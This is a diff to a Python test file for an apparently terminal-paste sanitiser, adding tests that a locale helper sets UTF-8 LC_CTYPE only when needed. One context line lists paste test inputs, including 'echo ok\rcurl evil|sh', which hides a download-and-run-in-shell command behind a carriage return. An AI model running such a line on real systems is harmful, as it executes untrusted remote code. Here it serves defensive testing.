@@ -1013,6 +1013,31 @@ for _t in ('', 'ls', 'ls\n', 'a\nb', 'a\r\nb', 'ls\r\n', 'echo ok\rcurl evil|sh'
 eq((_d2 := S.classify_paste_detail(chr(0x00E9)))['chars'], 1,
    'detail: char count (e-acute is one char)')
 eq(_d2['bytes'], 2, 'detail: byte count is UTF-8 length (e-acute is two bytes)')
+
+# ensure_utf8_ctype: the pty child must speak UTF-8 or a wide-char program renders each
+# byte as <ffffffff> (WEOF). Set a UTF-8 ctype ONLY when the ambient locale is not UTF-8;
+# never clobber a real UTF-8 locale, including one carrying an @modifier.
+_le = {}
+S.ensure_utf8_ctype(_le)
+eq(_le.get('LC_CTYPE'), 'C.UTF-8', 'locale: unset -> LC_CTYPE=C.UTF-8')
+_le = {'LANG': 'C'}
+S.ensure_utf8_ctype(_le)
+eq(_le.get('LC_CTYPE'), 'C.UTF-8', 'locale: C -> LC_CTYPE=C.UTF-8')
+_le = {'LANG': 'de_DE.UTF-8'}
+S.ensure_utf8_ctype(_le)
+ok('LC_CTYPE' not in _le, 'locale: a UTF-8 LANG is left untouched')
+_le = {'LC_CTYPE': 'en_US.utf8'}
+S.ensure_utf8_ctype(_le)
+eq(_le['LC_CTYPE'], 'en_US.utf8', 'locale: a UTF-8 LC_CTYPE (utf8 spelling) is kept')
+_le = {'LC_ALL': 'sr_RS.UTF-8@latin'}
+S.ensure_utf8_ctype(_le)
+eq(_le['LC_ALL'], 'sr_RS.UTF-8@latin',
+   'locale: a UTF-8 locale carrying an @modifier is preserved (not clobbered)')
+_le = {'LC_ALL': 'C', 'LANG': 'de_DE.UTF-8'}
+S.ensure_utf8_ctype(_le)
+eq(_le['LC_ALL'], 'C.UTF-8',
+   'locale: a non-UTF-8 LC_ALL (which would override LC_CTYPE) is retargeted to C.UTF-8')
+
 # sanitize_paste_unicode: keeps printable non-ASCII, drops the deceptive classes
 eq(S.sanitize_paste_unicode('caf' + chr(0x00E9)), 'caf' + chr(0x00E9),
    'unicode paste keeps printable non-ASCII')
